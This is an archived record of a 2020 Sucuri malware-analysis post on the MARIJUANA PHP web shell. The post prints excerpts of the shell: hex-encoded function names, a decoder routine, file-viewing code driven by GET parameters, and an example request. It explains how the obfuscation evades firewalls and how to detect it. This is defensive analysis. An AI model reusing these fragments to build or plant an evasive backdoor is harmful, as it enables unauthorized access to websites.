{
    "id": "565b7d08-c1a3-489d-ae74-6ec279d97115",
    "created_at": "2023-01-12T15:05:42.030803Z",
    "updated_at": "2025-03-27T02:05:54.715971Z",
    "deleted_at": null,
    "sha1_hash": "23d9e76ea705d9ebb062cffda16ae592138c1ecb",
    "title": "2020-12-04 - Obfuscation Techniques in MARIJUANA Shell “Bypass”",
    "authors": "",
    "file_creation_date": "2022-05-28T05:11:52Z",
    "file_modification_date": "2022-05-28T05:11:52Z",
    "file_size": 844818,
    "plain_text": "# Sucuri Blog\n\n**[blog.sucuri.net/2020/12/obfuscation-techniques-in-marijuana-shell-bypass.html](https://blog.sucuri.net/2020/12/obfuscation-techniques-in-marijuana-shell-bypass.html)**\n\nLuke Leal December 4, 2020\n\nAttackers are always trying to come up with new ways to evade detection from the wide\nrange of security controls available for web applications. This also extends to malware like\nPHP shells, which are typically left on compromised websites as a backdoor to maintain\nunauthorized access.\n\n\n-----\n\n**MARIJUANA is the name of a PHP shell that we have been tracking since last year. The**\nauthor has a GitHub page which promotes a claim that the shell possesses a “stealth” mode,\nwhich can be used to bypass website security services like web application firewalls (WAFs).\n\n\n-----\n\n## Obfuscation with Hexadecimal Values\n\nIn an attempt to evade signature-based scanners (and other security controls), attackers\noften take advantage of code obfuscation techniques. Sometimes, the entire file’s code will\nbe obfuscated, whereas, other times only specific sections of the code will be impacted.\n\nIn the case of this MARIJUANA shell, specific sections have been obfuscated — primarily\nPHP functions known to be suspicious or used in many types of malware.\n\nInstead of just using PHP functions in their plaintext form, the author chose to obfuscate\nthem by storing the functions in an array of hexadecimal values.\n\n\n-----\n\n```\n$Array [ 7068705f756e616d65, 70687076657273696f6e, 6368646972, 676574637764,\n'707265675f73706c6974', '636f7079', '66696c655f6765745f636f6e74656e7473',\n'6261736536345f6465636f6465', '69735f646972', '6f625f656e645f636c65616e28293b',\n'756e6c696e6b', '6d6b646972', '63686d6f64', '7363616e646972',\n'7374725f7265706c616365', '68746d6c7370656369616c6368617273', '7661725f64756d70',\n'666f70656e', '667772697465', '66636c6f7365', '64617465', '66696c656d74696d65',\n'737562737472', '737072696e7466', '66696c657065726d73', '746f756368',\n'66696c655f657869737473', '72656e616d65', '69735f6172726179', '69735f6f626a656374',\n'737472706f73', '69735f7772697461626c65', '69735f7265616461626c65',\n'737472746f74696d65', '66696c6573697a65', '726d646972', '6f625f6765745f636c65616e',\n'7265616466696c65', '617373657274', ];\n$___ = count($Array);\nfor ($i = 0;$i < $___;$i++)\n{\n  $GNJ[] = uhex($Array[$i]);\n}\n...\nfunction uhex($y)\n{\n  $n = '';\n  for ($i = 0;$i < strlen($y) - 1;$i += 2)\n  {\n    $n .= chr(hexdec($y[$i] . $y[$i + 1]));\n  }\n  return $n;\n}\n\n```\nThe custom function uhex contains PHP code used to deobfuscate the hexadecimal strings\nback into their plaintext PHP functions.\n\nIf we use PHP’s **[print_r, we can view these deobfuscated PHP functions in the array’s order.](https://www.php.net/manual/en/function.print-r.php)**\n```\n  [0] => php_uname - provides information on the server's operating system\n  [1] => phpversion - gets the current PHP version\n  [2] => chdir - changes directory, a mandatory feature of file managers\n  [3] => getcwd - get current working directory\n  [4] => preg_split - uses regex to split strings of data\n  [5] => copy - copy file contents\n  [6] => file_get_contents - used to get contents of a local file for viewing by\nthe attacker using the PHP shell\n  [7] => base64_decode - common decoding function\n...\n\n## Viewing File Contents on Compromised Websites\n\n```\nIn addition to storing the PHP functions in hexadecimal format, the script also receives\ncommands sent by the attacker in hexadecimal, converting to plaintext whenever they are\nreceived.\n\nA good example of this method in action can be seen in this PHP code, which is used to\nallow the PHP shell’s user to view the contents of a file within a compromised website’s\nenvironment:\n\n\n-----\n\n```\nif (isset($_GET[ s ]))\n{\n  echo $a_ . uhex($_GET[\"s\"]) . $b_ . '\n                  <textarea readonly=\"yes\">' . $GNJ[15]($GNJ[6]\n(uhex($_GET[\"s\"]))) . '</textarea>\n//this becomes htmlspecialchars(file_get_contents(index.php))\n                  <br />\n                  <br />\n                  <input onclick=\"location.href=\\'?d=' . $_GET[\"d\"]\n. '&e=' . $_GET[\"s\"] . '\\'\" type=\"submit\" class=\"w\" value=\"&nbsp;EDIT&nbsp;\" />\n                ' . $c_;\n}\n\n```\nAs an evasive maneuver, both the file_get_contents function and htmlspecialchars\nfunction are obfuscated, since these are common flags for malware. After the functions are\nconverted to plaintext from their hexadecimal format, they are then stored in the $GNJ\nvariable array.\n```\n$___ = count($Array);\nfor ($i = 0;$i < $___;$i++)\n{\n  $GNJ[] = uhex($Array[$i]);\n}\n\n```\nThis allows the attacker to use the variable’s name, $GNJ, along with the order that it\nappears within the array in brackets.\n\nThe PHP function assigned to the array position 15 is htmlspecialchars and\n**file_get_contents is assigned array position 6, allowing the attacker to use the variable**\narray in place of the PHP function and obfuscate its usage:\n```\n$GNJ[15]($GNJ[6](uhex($_GET[\"s\"]))) \n\n```\n⬇\n```\nhtmlspecialchars(file_get_contents((uhex($_GET[\"s\"])))\n\n```\nFinally, to allow the bad actor to view file contents from the shell, the attacker’s browser\nsubmits a GET request with “d” and “s” parameters containing the hexadecimal format for\nthe directory name and file name, respectively:\n```\nmarijuana.php?d=2f7661722f7777772f68746d6c2f776f72647072657373&s=696e6465782e706870\n\n```\n[To identify this type of malicious behavior, one option is to use a tool like asciitohex to quickly](https://www.asciitohex.com/)\nconvert the hexadecimal values above, helping you to determine that the request is trying to\nview the file index.php from within the directory /var/www/html/wordpress/. Another option\nis to use our [web application firewall, which detects and blocks these types of requests from](https://sucuri.net/website-firewall/)\never reaching your website.\n\n\n-----\n\nAll of these incoming obfuscated hexidecimal requests are supposed to make it more difficult\nfor WAFs to detect the traffic as malicious and block it.\n\nThis functionality ultimately results in a PHP shell that can be loaded in the browser and\nused to perform general file manager functions (upload, change permissions, view files, etc).\n\nSince PHP shells typically operate as backdoors, they shouldn’t load or disrupt your website\nand you would likely be unaware of their existence until you start seeing signs of a\ncompromised website. As a result, this type of malware is best detected on a website by\nusing [server-side scanning.](https://sucuri.net/malware-detection-scanning/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-04 - Obfuscation Techniques in MARIJUANA Shell “Bypass”.pdf"
    ],
    "report_names": [
        "2020-12-04 - Obfuscation Techniques in MARIJUANA Shell “Bypass”.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535942,
    "ts_updated_at": 1743041154,
    "ts_creation_date": 1653714712,
    "ts_modification_date": 1653714712,
    "files": {
        "pdf": "https://archive.orkl.eu/23d9e76ea705d9ebb062cffda16ae592138c1ecb.pdf",
        "text": "https://archive.orkl.eu/23d9e76ea705d9ebb062cffda16ae592138c1ecb.txt",
        "img": "https://archive.orkl.eu/23d9e76ea705d9ebb062cffda16ae592138c1ecb.jpg"
    }
}